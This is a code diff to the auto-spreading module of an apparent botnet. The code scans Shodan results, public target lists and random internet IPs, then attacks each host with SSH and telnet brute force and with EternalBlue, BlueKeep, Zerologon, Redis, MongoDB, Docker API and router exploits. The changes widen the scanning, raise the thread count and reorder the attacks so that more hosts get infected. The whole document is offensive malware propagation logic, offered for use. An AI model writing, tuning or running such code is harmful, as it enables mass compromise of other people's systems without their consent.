@@ -2,11 +2,11 @@ import asyncio, threading, time, json, os, random, ipaddress, socket, struct, qu
 from botnet.spreader import (
     ssh_bruteforce, telnet_bruteforce, exploit_eternalblue, exploit_bluekeep,
     exploit_mikrotik, exploit_zerologon, exploit_redis, exploit_mongodb,
-    exploit_docker_api, exploit_zyxel, exploit_realtek, init_db, add_bot
+    exploit_docker_api, exploit_zyxel, exploit_realtek, add_bot
 )
 from botnet.target_collector import fetch_targets
 from utils.logger import log
-import shodan, censys
+import shodan
 
 SCANNED_IPS_FILE = "scanned_ips.json"
 
@@ -28,7 +28,7 @@ class AutoSpreader:
             s = {}
         self.enabled = s.get("auto_spread_enabled", True)
         self.interval = s.get("auto_spread_interval_min", 0.5) * 60
-        self.worker_threads = s.get("spread_worker_threads", 1000)
+        self.worker_threads = s.get("spread_worker_threads", 2000)
         self.use_shodan = s.get("use_shodan", True)
         self.shodan_api = None
         try:
@@ -54,7 +54,7 @@ class AutoSpreader:
         self.stats = {'scanned':0, 'infected':0, 'open_ports':0}
         self.thread = threading.Thread(target=self._worker, daemon=True)
         self.thread.start()
-        self.message_queue.put("[System] INSTANT FIX запущен")
+        self.message_queue.put("[System] STORM BREAKER запущен")
 
     def stop(self):
         self.running = False
@@ -63,24 +63,13 @@ class AutoSpreader:
 
     async def attack_target(self, ip):
         ports = await ssh_bruteforce.__globals__['quick_port_scan'](
-            ip, [22,23,445,3389,8291,6379,27017,2375,2323,2222], timeout=0.3
+            ip, [22,23,445,3389,8291,6379,27017,2375,2323,2222,80,443,8080], timeout=0.2
         )
         if not ports:
             return False
         self.stats['open_ports'] += 1
         self.message_queue.put(f"[Ports] {ip} открыты: {ports}")
-        if 23 in ports or 2323 in ports:
-            for p in [23,2323]:
-                if p in ports:
-                    if (await telnet_bruteforce(ip, p))[0]:
-                        self.stats['infected'] += 1
-                        return True
-        if 22 in ports or 2222 in ports:
-            for p in [22,2222]:
-                if p in ports:
-                    if (await ssh_bruteforce(ip, 'root', p))[0]:
-                        self.stats['infected'] += 1
-                        return True
+        # Приоритет: сервисы без пароля / простые эксплойты
         if 6379 in ports and await exploit_redis(ip):
             self.stats['infected'] += 1; return True
         if 27017 in ports and await exploit_mongodb(ip):
@@ -94,6 +83,18 @@ class AutoSpreader:
                 self.stats['infected'] += 1; return True
             if await exploit_realtek(ip):
                 self.stats['infected'] += 1; return True
+        # Telnet
+        for p in [23,2323]:
+            if p in ports:
+                if (await telnet_bruteforce(ip, p))[0]:
+                    self.stats['infected'] += 1
+                    return True
+        # SSH
+        for p in [22,2222]:
+            if p in ports:
+                if (await ssh_bruteforce(ip, 'root', p))[0]:
+                    self.stats['infected'] += 1
+                    return True
         if 445 in ports:
             if any(await asyncio.gather(exploit_eternalblue(ip), exploit_zerologon(ip))):
                 self.stats['infected'] += 1; return True
@@ -108,7 +109,7 @@ class AutoSpreader:
             target_ips = []
             if self.shodan_api:
                 try:
-                    results = self.shodan_api.search("port:22,23,8291,80", limit=200)
+                    results = self.shodan_api.search("port:22,23,8291,80,6379,27017,2375", limit=500)
                     for match in results['matches']:
                         ip = match['ip_str']
                         if ip not in self.scanned_ips:
@@ -117,12 +118,12 @@ class AutoSpreader:
                 except: pass
             if not target_ips:
                 public = loop.run_until_complete(fetch_targets())
-                for ip in public:
+                for ip in public[:5000]:
                     if ip not in self.scanned_ips:
                         target_ips.append(ip)
                         self.scanned_ips.add(ip)
             if not target_ips:
-                for _ in range(200):
+                for _ in range(500):
                     ip = str(ipaddress.IPv4Address(random.randint(0x01000000, 0xDFFFFFFF)))
                     if ip not in self.scanned_ips:
                         target_ips.append(ip)
